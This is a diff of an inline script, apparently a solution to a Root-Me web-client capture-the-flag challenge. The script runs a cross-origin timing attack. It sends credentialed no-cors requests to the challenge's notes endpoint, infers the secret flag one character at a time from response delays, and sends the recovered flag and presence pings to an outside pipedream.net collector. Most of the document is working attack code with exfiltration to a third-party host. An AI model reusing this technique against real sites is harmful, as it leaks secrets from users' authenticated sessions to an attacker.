@@ -23,22 +23,30 @@
 
     </script> -->
     <script>
-        fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?présence=JeSuisLa`)
-        for (let i = 0; i < 76; i++) {
-            let alpha = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_+="
+        fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?presence=JeSuisLa`)
+        for (let i = 0; i < 50; i++) {
+            let alpha = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_+="
+            let flag = "z"
+            let cnt = 0
             // Start the clock
             var start = performance.now()
 
             // Measure how long it takes to complete the fetch requests
-            fetch(`https://web-client-ch56.challenge01.root-me.org:58056/notes/${392}/zc4r3_4b0ut_+s4mes1t3_c00k1${alpha[i]}`, {
+            fetch(`https://web-client-ch56.challenge01.root-me.org:58056/notes/${392}/z${alpha[i]}`, {
                 mode: 'no-cors',
                 credentials: 'include'
             }).then(() => {
                 // When fetch finishes, calculate the difference
                 var time = performance.now() - start;
                 console.log("The request took %d ms.", time);
-                if (time > 1800) {
-                    fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?lettre=${alpha[i]}&temps=${time}ms`)
+                if (time >= 2000) {
+                    //fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?lettre=${alpha[i]}&temps=${time}ms`)
+                    flag = flag + alpha[i];
+                    cnt++;
+                    if (cnt > 6) {
+                        fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?flag=${flag}`)
+                    }
+                    i = 0;
                 }
             });
         }
